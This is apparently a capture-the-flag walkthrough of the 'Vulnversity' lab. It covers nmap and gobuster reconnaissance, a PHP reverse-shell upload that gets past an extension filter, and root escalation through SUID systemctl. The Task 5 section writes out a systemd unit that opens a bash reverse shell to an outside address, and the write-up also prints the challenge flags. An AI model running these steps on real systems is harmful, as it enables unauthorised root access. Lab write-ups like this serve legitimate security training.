# Vulnversity

## Task 1  Deploy the machine
- deploy

## Task 2  Reconnaissance
- There are many Nmap "cheatsheets" online that you can use too.
- Scan the box; how many ports are open? 6
  ```
  nmap -sC -sV 10.10.10.1 -T4
  ```
What version of the squid proxy is running on the machine? 3.5.12
How many ports will Nmap scan if the flag -p-400 was used? 400
What is the most likely operating system this machine is running? Ubuntu
What port is the web server running on? 3333
What is the flag for enabling verbose mode using Nmap? -v

## Task 3  Locating directories using Gobuster
- What is the directory that has an upload form page? /internal/
  ```
  gobuster dir -u http://10.10.10.1:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 100

  /internal/
  ```

## Task 4  Compromise the Webserver
- What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.? .php
  ```
  make file revshell .php, .php3, .php4, .php5, .phtml
  make file ext.txt > .php, .php3, .php4, .php5, .phtml

  open burpsuite
  and connect to proxy server with foxyproxy and add 127.0.0.1:8080
  submit and go to intereped
  and add payload file.ext
  ```
- Run this attack, what extension is allowed? .phptml
- What is the name of the user who manages the webserver? bill
  ```
  ls /home

  bill
  ```
- What is the user flag? 8bd7992fbe8a6ad22a63361004cfcedb
  ```
  cd /home/bill
  cat user.txt
  ```

## Task 5  Privilege Escalation
- On the system, search for all SUID files. Which file stands out? /bin/systemctl
  ```
  # target
  find / -user root -perm -4000 -exec ls -ldb {} \;
  ```
- It's challenge time! We have guided you through this far. Can you exploit this system further to escalate your privileges and get the final answer? a58ff8579f0a9270368d33a9966c7fd5
  ```
  # host
  find bash revese shell > tcp add add in execstar and change the ip ur ip tunel

  add file fake.service


  [unit]
  Description=fake

  [Service]
  Type=simple
  User=root
  ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"

  [Install]
  WantedBy=multi-user.target

  simpen dan jalankan server web dan pindahkan ke # target dan jalankan
  cd /tmp
  wget http:/10.10.10.10/fake.service

  systemctl enable /tmp/fake.service
  systemctl start fake

  a58ff8579f0a9270368d33a9966c7fd5
  ```